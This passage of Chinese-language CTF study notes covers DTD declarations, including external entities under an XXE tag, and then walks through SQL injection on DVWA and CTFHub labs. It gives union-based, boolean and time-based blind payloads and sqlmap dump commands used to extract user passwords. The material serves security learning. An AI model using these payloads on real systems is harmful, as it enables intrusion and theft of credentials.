class="headerlink" title="只有PCDATA的元素"></a>只有PCDATA的元素</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT 元素名称 (#PCDATA)&gt;<br></code></pre></td></tr></table></figure><h3 id="带有任何内容的元素"><a href="#带有任何内容的元素" class="headerlink" title="带有任何内容的元素"></a>带有任何内容的元素</h3><p>关键词<code>ANY</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT 元素名称 ANY&gt;<br></code></pre></td></tr></table></figure><h3 id="带有子元素（序列）的元素"><a href="#带有子元素（序列）的元素" class="headerlink" title="带有子元素（序列）的元素"></a>带有子元素（序列）的元素</h3><p>带有一个或多个子元素的元素通过圆括号中的子元素名进行声明：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">1⃣️&lt;!ELEMENT 元素名称 (子元素名称 1)&gt;<br>2⃣️&lt;!ELEMENT 元素名称 (子元素名称 1,子元素名称 2,.....)&gt; &lt;!--由逗号分隔开的序列进行声明并且按照相同的顺序出现在XML文档中--&gt;<br></code></pre></td></tr></table></figure><h4 id="不同的元素声明"><a href="#不同的元素声明" class="headerlink" title="不同的元素声明"></a>不同的元素声明</h4><ul><li><p>子元素只出现一次：语法为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> 元素名称 (子元素名称)&gt;<br></code></pre></td></tr></table></figure></li><li><p>子元素出现零次或一次：语法为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> 元素名称 (子元素名称<span class="hljs-string">?)</span>&gt;<br></code></pre></td></tr></table></figure></li><li><p>子元素出现零次或多次：语法为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> 元素名称 (子元素名称*)&gt;<br></code></pre></td></tr></table></figure></li><li><p>子元素出现一次或多次：语法为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> 元素名称 (子元素名称+)&gt;<br></code></pre></td></tr></table></figure></li><li><p>子元素为多选一类型：语法为：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> 元素名称 (子元素名称<span class="hljs-number">1</span>|<span class="hljs-params">元素名称2</span>|子元素名称<span class="hljs-number">3</span>|<span class="hljs-params">...)&gt;</span><br><span class="hljs-params"># 这里则不需要遵循子元素出现的顺序来写声明，只需包含所有可能出现的子元素即可（也可以添加一些不可能出现的元素，当然这样写并没有必要)</span><br><span class="hljs-params"># 只能出现一个，不然会报错</span><br></code></pre></td></tr></table></figure></li><li><p>多种类型的子元素混合：举个例子：</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby">&lt;!<span class="hljs-variable constant_">ELEMENT</span> book (name,author?,(price|<span class="hljs-params">press</span>|date)*)&gt;<br></code></pre></td></tr></table></figure></li></ul><p>这个声明的含义为：<code>book</code>元素包含只出现一次的<code>name</code>子元素、出现零次或一次的<code>author</code>子元素以及出现零次或多次的<code>price</code>、<code>press</code>、<code>date</code>三个子元素中的一个</p><blockquote><p>对于<code>?</code>、<code>*</code>以及<code>+</code>这三个符号的含义，可以类比于正则表达式进行记忆</p></blockquote><h2 id="属性声明"><a href="#属性声明" class="headerlink" title="属性声明"></a>属性声明</h2><h3 id="语法-1"><a href="#语法-1" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;<br></code></pre></td></tr></table></figure><p>DTD 实例:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST payment type CDATA &quot;check&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML 实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;check&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>以下是<strong>属性类型</strong>的选项：</p><table><thead><tr><th align="left">类型</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">CDATA</td><td align="left">值为字符数据 (character data)</td></tr><tr><td align="left">(<em>en1</em>|<em>en2</em>|..)</td><td align="left">此值是枚举列表中的一个值</td></tr><tr><td align="left">ID</td><td align="left">值为唯一的 id</td></tr><tr><td align="left">IDREF</td><td align="left">值为另外一个元素的 id</td></tr><tr><td align="left">IDREFS</td><td align="left">值为其他 id 的列表</td></tr><tr><td align="left">NMTOKEN</td><td align="left">值为合法的 XML 名称</td></tr><tr><td align="left">NMTOKENS</td><td align="left">值为合法的 XML 名称的列表</td></tr><tr><td align="left">ENTITY</td><td align="left">值是一个实体</td></tr><tr><td align="left">ENTITIES</td><td align="left">值是一个实体列表</td></tr><tr><td align="left">NOTATION</td><td align="left">此值是符号的名称</td></tr><tr><td align="left">xml:</td><td align="left">值是一个预定义的 XML 值</td></tr></tbody></table><p>默认值参数可使用下列值：</p><table><thead><tr><th align="left">值</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left">值</td><td align="left">属性的默认值</td></tr><tr><td align="left">#REQUIRED</td><td align="left">属性值是必需的</td></tr><tr><td align="left">#IMPLIED</td><td align="left">属性不是必需的</td></tr><tr><td align="left">#FIXED value</td><td align="left">属性值是固定的</td></tr></tbody></table><p>🌰–规定一个默认的属性值</p><p>DTD: 给square元素规定了一个默认值为0的width属性,”square” 被定义为带有 CDATA 类型的 “width” 属性的空元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ELEMENT square EMPTY&gt;<br>&lt;!ATTLIST square width CDATA &quot;0&quot;&gt;<br></code></pre></td></tr></table></figure><p>合法的 XML: 仍可以给被预定义的属性赋值</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">square</span> <span class="hljs-attr">width</span>=<span class="hljs-string">&quot;100&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="IMPLIED"><a href="#IMPLIED" class="headerlink" title="#IMPLIED"></a>#IMPLIED</h3><p>属性不是必需的</p><h4 id="语法-2"><a href="#语法-2" class="headerlink" title="语法"></a>语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST 元素名称 属性名称 属性类型 #IMPLIED&gt;<br></code></pre></td></tr></table></figure><p>🌰</p><p>DTD:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST contact fax CDATA #IMPLIED&gt;<br></code></pre></td></tr></table></figure><p>合法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">contact</span> <span class="hljs-attr">fax</span>=<span class="hljs-string">&quot;555-667788&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>合法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">contact</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="REQUIRED"><a href="#REQUIRED" class="headerlink" title="#REQUIRED"></a>#REQUIRED</h3><p>属性是必需的,适用于没有默认值选项，但强制要求提交属性值</p><h3 id="语法-3"><a href="#语法-3" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST 元素名称 属性名称 属性类型 #REQUIRED&gt;<br></code></pre></td></tr></table></figure><p>🌰</p><p>DTD:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST person number CDATA #REQUIRED&gt;<br></code></pre></td></tr></table></figure><p>合法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">person</span> <span class="hljs-attr">number</span>=<span class="hljs-string">&quot;5677&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>非法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">person</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="FIXED"><a href="#FIXED" class="headerlink" title="#FIXED"></a>#FIXED</h3><p>属性值固定,预先定义属性值，不可更改(类比const)</p><h3 id="语法-4"><a href="#语法-4" class="headerlink" title="语法"></a>语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST 元素名称 属性名称 属性类型 #FIXED &quot;value&quot;&gt;<br></code></pre></td></tr></table></figure><p>🌰</p><p>DTD:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST sender company CDATA #FIXED &quot;Microsoft&quot;&gt;<br></code></pre></td></tr></table></figure><p>合法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sender</span> <span class="hljs-attr">company</span>=<span class="hljs-string">&quot;Microsoft&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>非法的 XML:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">sender</span> <span class="hljs-attr">company</span>=<span class="hljs-string">&quot;W3School&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="列举属性值"><a href="#列举属性值" class="headerlink" title="列举属性值"></a>列举属性值</h3><h3 id="语法："><a href="#语法：" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST 元素名称 属性名称 (en1|en2|..) 默认值&gt;<br></code></pre></td></tr></table></figure><p>DTD 例子:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ATTLIST payment type (check|cash) &quot;cash&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;check&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;cash&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h2 id="实体声明"><a href="#实体声明" class="headerlink" title="实体声明"></a>实体声明</h2><p>实体是用于定义引用普通文本或特殊字符的快捷方式的变量。</p><p>实体引用是对实体的引用。</p><p>实体可在内部或外部进行声明。</p><h3 id="内部实体声明"><a href="#内部实体声明" class="headerlink" title="内部实体声明"></a>内部实体声明</h3><h3 id="语法：-1"><a href="#语法：-1" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;<br></code></pre></td></tr></table></figure><p>🌰</p><p>DTD 例子:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY writer &quot;Bill Gates&quot;&gt;<br>&lt;!ENTITY copyright &quot;Copyright W3School.com.cn&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>一个实体由三部分构成: 一个和号 <code>&amp;</code>, 一个实体名称, 以及一个分号 <code>;</code></p></blockquote><h3 id="外部实体声明"><a href="#外部实体声明" class="headerlink" title="外部实体声明"></a>外部实体声明</h3><h3 id="语法：-2"><a href="#语法：-2" class="headerlink" title="语法："></a>语法：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt; &lt;!--也可以用协议--&gt;<br></code></pre></td></tr></table></figure><p>💡不同环境下可用协议</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032236978.jpg" alt="aaa"></p><p>🌰</p><p>DTD 例子:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY writer SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;<br>&lt;!ENTITY copyright SYSTEM &quot;http://www.w3school.com.cn/dtd/entities.dtd&quot;&gt;<br></code></pre></td></tr></table></figure><p>XML 例子:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">author</span>&gt;</span><span class="hljs-symbol">&amp;writer;</span><span class="hljs-symbol">&amp;copyright;</span><span class="hljs-tag">&lt;/<span class="hljs-name">author</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="实体的嵌套"><a href="#实体的嵌套" class="headerlink" title="实体的嵌套"></a><strong>实体的嵌套</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dtd">&lt;!ENTITY %实体名称 &quot;值&quot;&gt; &lt;!--内部--&gt;<br>&lt;!ENTITY %实体名称 SYSTEM &quot;URL&quot;&gt; &lt;!--外部--&gt;<br></code></pre></td></tr></table></figure><h3 id="实体分类"><a href="#实体分类" class="headerlink" title="实体分类"></a>实体分类</h3><p>实体又分为一般实体和参数实体,字符实体,命名实体</p><p>1，一般实体的声明语法:<!ENTITY 实体名 "实体内容"><br>引用实体的方式：&amp;实体名；</p><p>2，参数实体只能在DTD中使用，参数实体的声明格式： <!ENTITY % 实体名 "实体内容"><br>引用实体的方式：%实体名；</p><blockquote><p>有SYSTEM关键字引用数据的实体就是参数实体</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> xxe </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入学习</title>
      <link href="/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/01/23/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL注入原理"><a href="#SQL注入原理" class="headerlink" title="SQL注入原理"></a>SQL注入原理</h1><h2 id="一、定义"><a href="#一、定义" class="headerlink" title="一、定义"></a>一、定义</h2><p>SQL注入是指在判断出注入点后，将<strong>恶意的SQL语句</strong>添加到输入参数中，使得后台服务器<u>执行添加的SQL语句</u>，从而达到窃取网站敏感信息等目的</p><h2 id="二、实例及原理"><a href="#二、实例及原理" class="headerlink" title="二、实例及原理"></a>二、实例及原理</h2><h3 id="2-1字符型注入-dvwa平台sql注入简单级别"><a href="#2-1字符型注入-dvwa平台sql注入简单级别" class="headerlink" title="2.1字符型注入(dvwa平台sql注入简单级别)"></a>2.1字符型注入(dvwa平台sql注入简单级别)</h3><h4 id="查看回显"><a href="#查看回显" class="headerlink" title="查看回显"></a>查看回显</h4><p>输入用户id为1，发现URL中也出现ID&#x3D;1，说明使用get方式传参数，查看回显，返回了ID为1的用户信息<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221760.png" alt="1"></p><h4 id="审计源代码"><a href="#审计源代码" class="headerlink" title="审计源代码"></a>审计源代码</h4><ul><li>发现主要执行的SQL语句为:</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;$id&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><blockquote><p>类似这类传入参数以<code>&#39;</code>包裹的称为字符型注入，可以通过传入 <code>1&#39; xxx#</code>(xxx为恶意的SQL语句)的方式来执行恶意的SQL语句<br><strong>原因</strong>:</p><ul><li>数字后跟的<code>&#39;</code>与源码中$id前的<code>&#39;</code>优先匹配，后面的SQL语句只要用union与前面的SELECT语句连接，就可以做到让后台服务器执行能达到攻击目的的SQL语句。</li><li>最后的<code>#</code>作用是将语句结尾的<code>&#39;</code>和<code>;</code>注释掉，将<code>&#39;</code>注释掉是为了防止语法错误，并且对于单句SQL语句即使没有<code>;</code>也可以正常执行</li></ul></blockquote><ul><li>回显部分的代码为:</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;<br>    <span class="hljs-comment">// Get values</span><br>    <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];<br>    <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];<br>    <span class="hljs-comment">// Feedback for end user</span><br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br/&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br/&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>由于使用while循环，可以猜想到如果执行的SQL语句union上别的SQL语句(联合查询)，只要查询的字段数和类型相同，每一行的数据都可以被回显出来</p></blockquote><h4 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h4><p>SQL语言中<code>order by</code>关键字用于给查询的表添加排序条件并且处于SELECT语句末尾，正常情况下我们并不知道查询结果的字段名，但可以在<code>order by</code>后直接跟数字1表示按第一字段排序，用此方式发现在输入 <code>1&#39; and order by 3#</code>时发生错误，因此得知查询结果总列数为2,这表示之后union 后的select语句仅仅只能查询<strong>两个字段</strong><br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221721.png" alt="1"></p><h4 id="获取库名、表名、字段名"><a href="#获取库名、表名、字段名" class="headerlink" title="获取库名、表名、字段名"></a>获取库名、表名、字段名</h4><ul><li>获取库名,要想获取关键信息，得知道库名、表名、字段名，利用user()和database()函数分别获取用户名和数据库名称<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221259.png" alt="1"></li></ul><blockquote><p>由于该情景下union后的select语句必须有两个字段，这里主要获取数据库名称，user()可以替换成其他函数或者常量等等都可以</p><h3 id="获取所有库名"><a href="#获取所有库名" class="headerlink" title="获取所有库名"></a>获取所有库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> group_concat(schema_name) <span class="hljs-keyword">FROM</span> information_schema.schemata<br></code></pre></td></tr></table></figure></blockquote><ul><li>获取表名,这边需要了解到<code>information_schema</code>是mysql自带的数据库，其中名为<code>tables</code>的表中的两个字段<code>table_name</code>和<code>table_schema</code>记录了DBMS中的存储的表名和表名所在的数据库。现在我们已经知道了数据库名称为<code>dvwa</code>，可以加入WHERE进行条件查询,最终后台服务器运行的SQL语句为:</li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> first_name, last_name <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> user_id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span><br><span class="hljs-keyword">union</span><br><span class="hljs-keyword">select</span> table_name, table_schema <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">where</span> table_schema<span class="hljs-operator">=</span> <span class="hljs-string">&#x27;dvwa&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>得到表名有两个，分别为<code>guestbook</code>和 <code>users</code>，根据经验判断网站敏感信息存储在users表中</p></blockquote><ul><li><p>获取字段名，<code>information_schema</code>中有一张名为<code>columns</code>的表，其中<code>column_name</code>存储了字段名，通过增加条件<code>table_name = &#39;users&#39;</code>，成功获取<code>users</code>表的字段名<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221711.png" alt="1"></p></li><li><p><strong>获取敏感信息</strong>: 从字段名可看出，user和password存储着重要信息，添加<code>select user, password from dvwa.users</code> 即可得到账号及密码，密码使用了md5加密<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221287.png" alt="1"></p></li></ul><h3 id="2-2-整数型注入-CTFHub技能树"><a href="#2-2-整数型注入-CTFHub技能树" class="headerlink" title="2.2 整数型注入(CTFHub技能树)"></a>2.2 整数型注入(CTFHub技能树)</h3><ul><li>输入1，由下方红字提示输入的内容没有被<code>&#39;</code>包裹，这种称为整数型输入，输入<code>1 and 1=2</code>没有回显也可以验证这是整数型注入，因为如果是字符型，字符串’1 and 1&#x3D;2’自动转换成整数1，仍有回显<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221732.png" alt="1"></li></ul><blockquote><p>SQL中字符串自动转换成整型规律：从左边第一个字符开始排查起，转换成出现的第一个非数字字符前的数字对应的整型，如果第一个字符就不是数字，则转换成0</p></blockquote><ul><li>继续使用同字符型注入同样的方法，<strong>判断完列数后</strong>在输入的ID后跟上union语句,发现回显仍为id为1的信息，原因猜测是该网页只会回显查询结果的第一行，因此要实现让前一个select语句查询结果为空，可以让其WHERE后跟的条件始终为加，如：<code>1 and 1=2</code><br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032221925.png" alt="1"></li><li>剩下的同字符型注入一样的流程：得到数据库名、表名、字段名，需要注意的是，查询结果只返回一行，为了防止查询结果有多行无法显示完全，使用<code>group_concat(字段名)</code>函数，将所有行综合为一行输出，最终得到flag<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222504.png" alt="1"></li></ul><h3 id="2-3-SQL盲注"><a href="#2-3-SQL盲注" class="headerlink" title="2.3 SQL盲注"></a>2.3 SQL盲注</h3><p>盲注指SQL语句执行查询后，查询数据不能回显到前端页面中</p><h4 id="可能需要用到的函数、关键字"><a href="#可能需要用到的函数、关键字" class="headerlink" title="可能需要用到的函数、关键字"></a>可能需要用到的函数、关键字</h4><ul><li>substr(字符串,索引开始位,索引结束位):用于获取字符串中的特定字符</li><li><code>limit 开始行数的索引,显示的总行数</code>:放在select查询语句最后,限制显示行数,索引从0开始</li><li>ascii(字符):将某个字符转换为ascii值</li><li>ord(str)：函数返回字符串str的最左边字符的ASCII码值</li></ul><h4 id="布尔盲注-字符型为例"><a href="#布尔盲注-字符型为例" class="headerlink" title="布尔盲注(字符型为例)"></a>布尔盲注(字符型为例)</h4><p>适用于回显只有两种的情况，如<code>User ID exists in the database.</code>和<code>User ID is MISSING from the database.</code>分别对应了输入语句返回的布尔值。</p><ul><li>如果采用手动注入，一般要结合二分查找、穷举法等方法来逐一破解出库、表、字段的名称。(以下为猜解数据库名称的例子)</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-title function_">count</span><span class="hljs-params">(schema_name)</span> from information_schema.schemata)&gt; n # <span class="hljs-comment">//猜解数据库个数</span><br>1&#x27; and <span class="hljs-title function_">length</span><span class="hljs-params">(database())</span>=n # <span class="hljs-comment">//n为大于1的整数,猜解数据库名称长度</span><br><span class="hljs-number">1&#x27;</span> <span class="hljs-keyword">union</span> select <span class="hljs-title function_">ascii</span><span class="hljs-params">(substr((select schema_name from information_schema.schemata limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))</span>)&gt;n # <span class="hljs-comment">//n为大小写字母对应的ASCII码值，此处需借用二分查找来逐一确定每一个数据库的名称</span><br></code></pre></td></tr></table></figure><ul><li>可以借用sqlmap工具来自动化实现这种机器的过程，mac下具体指令为</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch --dbs  <span class="hljs-comment">//获取数据库名称,batch意思为不询问输入默认输入Y</span><br>sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch -D 数据库名 --tables <span class="hljs-comment">//获取表名</span><br>sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 --columns <span class="hljs-comment">//获取字段名</span><br>sqlmap -u <span class="hljs-string">&quot;网址&quot;</span> --batch -D 数据库名 -T 表名 -C 字段名 --dump <span class="hljs-comment">//获取字段内存储信息</span><br></code></pre></td></tr></table></figure><p>最终得到flag<br><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032222451.png" alt="1"></p><h4 id="时间盲注-字符型为例"><a href="#时间盲注-字符型为例" class="headerlink" title="时间盲注(字符型为例)"></a>时间盲注(字符型为例)</h4><p>仅要求有回显，主要原理是利用SQL中if函数及sleep函数再加上其他用于拆解字符串、转换字符为ASCII码值的函数，sleep函数作为if函数的第二个参数，猜解名称的函数作为if的第一个参数，第三个参数可以任意赋值，但不能与sleep函数相同，因此若猜解函数返回正确，则执行sleep函数，效果为网页延迟了设定的描述才显示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">1&#x27;</span> and <span class="hljs-title function_">if</span> <span class="hljs-params">((ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">100</span>),sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>)</span> # <span class="hljs-comment">//判断数据库名称第一个字符是否为&#x27;d&#x27;，结果显示明显延迟</span><br></code></pre></td></tr></table></figure><h2 id="三、判断注入点"><a href="#三、判断注入点" class="headerlink" title="三、判断注入点"></a>三、判断注入点</h2><h3 id="3-1判断是否存在SQL注入漏洞"><a href="#3-1判断是否存在SQL注入漏洞" class="headerlink" title="3.1判断是否存在SQL注入漏洞"></a>3.1判断是否存在SQL注入漏洞</h3><p>输入<code>1&#39;</code>如果报错，则存在注入漏洞，报错原因是单引号数量不匹配，如果没报错，说明可能该网页过滤了单引号</p><h3 id="3-2判断是字符型还是整数型"><a 